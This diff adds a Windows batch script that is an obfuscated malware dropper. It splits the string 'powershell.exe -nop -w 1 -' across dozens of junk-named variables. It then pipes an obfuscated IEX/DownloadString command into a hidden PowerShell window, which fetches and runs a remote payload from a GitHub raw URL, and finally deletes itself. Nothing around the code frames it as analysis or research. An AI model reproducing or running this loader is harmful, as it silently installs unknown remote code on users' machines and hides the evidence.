@@ -1,0 +1,39 @@
+@echo off
+set XOI=SZGKSPS962536
+cd %SystemRoot%\System32
+set WSD=FWR433016
+set EXUBEU=Win
+set KHZN=GRXXJM306529
+set TVX=dow
+set ZIYC=GAAXPW861021
+set URZBA=sPo
+set XHXEBX=ARTT430154
+set AHCA=wer
+set IGZ=DPRH612080
+set BKNXJR=She
+set NHVCEP=AIU685134
+set UBV=ll\v1
+set DDQU=WA565245
+set UVAL=.
+set CYB=CXK166121
+set XBQCBG=0\po
+set JOD=SOVXZNR693290
+set DIJQFZ=we
+set AGO=VBFGFWV101973
+set HAZSJ=rsh
+set JYK=OUP838552
+set AAKSKE=ell
+set MAVW=YMF567890
+set FREG=.ex
+set IGVQ=FTKEB424230
+set TRMI=e -n
+set FVL=KBVY485661
+set HZNIXQ=op 
+set KOASW=ORD610752
+set JZWTM=-w
+set DOFEH=UT489982
+set RRFDG=in 1 -
+set GOTR=J753549
+set NN=https://raw.githubusercontent.com/factu1/factu1/main/8.txt
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('%NN%')"); | %EXUBEU%%TVX%%URZBA%%AHCA%%BKNXJR%%UBV%%UVAL%%XBQCBG%%DIJQFZ%%HAZSJ%%AAKSKE%%FREG%%TRMI%%HZNIXQ%%JZWTM%%RRFDG%
+DEL "%~f0"
